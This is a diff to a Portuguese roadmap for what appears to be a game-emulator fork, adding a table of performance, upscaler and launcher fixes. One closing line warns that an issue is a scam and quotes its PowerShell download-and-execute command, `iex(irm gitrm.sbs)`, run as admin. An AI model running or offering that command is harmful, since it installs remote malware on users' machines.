@@ -198,6 +198,23 @@ Detalhes e números de cada versão no [CHANGELOG](../../CHANGELOG.md).
 | 37 | Geração de quadros 2x no deserto (1% low apresentado) | ⏳ | Depende de medição no lançador real (F10). |
 | 38 | Água, barra de stamina tremendo, AMD GCN, Intel Arc, FSR 4.1 | ⏳ | Faltam RenderDoc, hardware ou SDK. |
 
+## Fase 8 — Fork Lucas-blip-png, 0.60.6-plus22 a plus27 (28/10 a 30/10)
+
+| # | Item | Estado | Notas |
+|---|---|---|---|
+| 39 | Vazamento do processador de comandos (Lukto02, PR #2), correções do cache de texturas da C1, notas em inglês no lançador (plus22) | ✅ | ~44 MB/min a menos. |
+| 40 | F8 em rajada derrubava o driver NVIDIA; diagnóstico `BB_WRITE_LOG=3` (plus23) | ✅ | Ruído colorido no chão do deserto depois de carga: sem causa ainda. |
+| 41 | Cache de shaders em journal, escritor em segundo plano, compute especulativo (Lukto02, PR #3, plus24) | ✅ | |
+| 42 | 21:9 e 32:9 sem a cena esticada (#4, plus25) | 🔧 | Volta o pedaço cinza da barra de vida em 21:9 (#301). |
+| 43 | CPUs de 4 threads +19% (MMadmer), HUD sem rastro com FSR 3.1/DLSS, trava de 30 no Pro (AjncSystem), DMA desligado na Intel, HDR (tabnul), força da vibração (plus26) | ✅ | |
+| 44 | DLSS: espera do Reflex só com DLSS-G (+6% no Santuário); só o plugin do DLSS sem geração de quadros (plus27) | 🔧 | Queda com Low Latency Mode Ultra (2mg, #5): causa provável, falta confirmar com o Ultra ligado. |
+| 45 | Nitidez no FSR 3.1/DLSS/FSR 1 sem ampliação; F8 sem perder o DLSS; LOD do upscaler em -1; arenas sob pressão de VRAM (plus27) | ✅ | |
+| 46 | Lançador: "Sugerir para meu PC", preset Máximo, saves em Documentos, pular a abertura, opções em cinza (plus27) | ✅ | Requisitos por preset e resolução no topo do README. |
+| 47 | F1: opções só do lançador em cinza com o motivo; textura só no lançador (plus27) | ✅ | Pedido do usuário. |
+| 48 | Limite de CPU do Santuário (~72 FPS no 5700X) | ❌ | Cadeia de latência (jogo ↔ CP ↔ GpuDraw ↔ gravação ↔ GPU); +2 ms na thread de desenho = +0,5 ms no quadro. Agrupar `VirtualProtect` e otimizar só a `GpuDraw`: teto ~0. |
+| 49 | Trocas de área sem o FPS cair perto de zero, queda `0x49800` (upstream 0.70, AjncSystem) | ⏳ | 23 conflitos no núcleo de memória; próxima versão (0.70-plus1), com teste de troca de área. |
+| 50 | AMD GCN: o AMD-Fix (raulbezerro-dev) com o nosso wave32 desligado parou as quedas numa RX 570 (brxzzi, #9) | ⏳ | Achar qual efeito do "driver NVIDIA" segura a queda (barreiras LDS, interpolação manual, clip distance, baricêntricas por GS, RTZ) e ligar só ele nas GCN. |
+
 ## Fora do roteiro
 
 - Issue #138 é golpe (malware: `iex(irm gitrm.sbs)` como admin) — apagar e denunciar a conta.
